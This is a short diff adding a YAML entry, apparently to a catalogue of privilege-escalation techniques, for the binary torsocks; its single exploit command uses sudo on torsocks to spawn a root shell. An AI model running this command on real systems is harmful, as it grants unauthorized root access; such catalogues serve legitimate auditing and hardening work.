@@ -1,0 +1,4 @@
+name: torsocks
+binary_path: /usr/bin/torsocks
+exploit_cmds:
+- sudo /usr/bin/torsocks /bin/sh
